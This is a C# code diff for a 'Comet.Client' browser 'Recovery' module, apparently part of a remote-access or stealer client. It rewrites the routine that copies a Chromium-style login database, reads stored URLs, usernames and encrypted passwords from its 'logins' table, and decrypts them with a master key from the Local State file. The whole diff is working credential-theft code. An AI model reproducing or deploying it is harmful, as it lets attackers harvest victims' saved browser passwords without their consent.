@@ -2,7 +2,7 @@
 using Comet.Client.Recovery.Utilities;
 using Comet.Common.DNS;
 using Comet.Common.Models;
-using CS_SQLite3;
+using PwdView;
 using System;
 using System.Collections.Generic;
 using System.Data;
@@ -12,6 +12,7 @@ using System.IO;
 using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Xml.Linq;
 
@@ -48,23 +49,17 @@ namespace Comet.Client.Recovery.Browsers
                 {
                     File.Copy(filePath, filePath + "B", true);
                     filePath += "B";
-                    SQLiteDatabase database = new SQLiteDatabase(filePath);
-                    string query = "SELECT origin_url, username_value, password_value FROM logins";
-                    DataTable resultantQuery = database.ExecuteQuery(query);
-                    foreach (DataRow row in resultantQuery.Rows)
+                    SqlLite3Parser parser = new SqlLite3Parser(File.ReadAllBytes(filePath));
+                    parser.ReadTable("logins");
+                    Parallel.For(0, parser.GetRowCount(), i =>
                     {
-                        string url;
-                        string username;
-                        string password = "";
-                        string crypt_password;
-                        url = (string)row["origin_url"].ToString();
-                        username = (string)row["username_value"].ToString();
-                        crypt_password = row["password_value"].ToString();
-                        byte[] passwordBytes = Convert.FromBase64String(crypt_password);
-                        byte[] masterKey = GetMasterKey(localStatePath);
-                        password = DecryptWithKey(passwordBytes, masterKey);
-                        if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(username))
+                        byte[] password_buffer = parser.GetValue<byte[]>(i, "password_value");
+                        string username = parser.GetValue<string>(i, "username_value").Trim();
+                        string url = parser.GetValue<string>(i, "origin_url").Trim();
+                        if (password_buffer != null && !string.IsNullOrWhiteSpace(username) && !string.IsNullOrWhiteSpace(url))
                         {
+                            byte[] masterKey = GetMasterKey(localStatePath);
+                            string password = DecryptWithKey(password_buffer, masterKey);
                             result.Add(new SaveUser
                             {
                                 Url = url,
@@ -73,8 +68,7 @@ namespace Comet.Client.Recovery.Browsers
                                 Application = ApplicationName
                             });
                         }
-                    }
-                    database.CloseDatabase();
+                    });
                 }
                 catch (Exception)
                 {
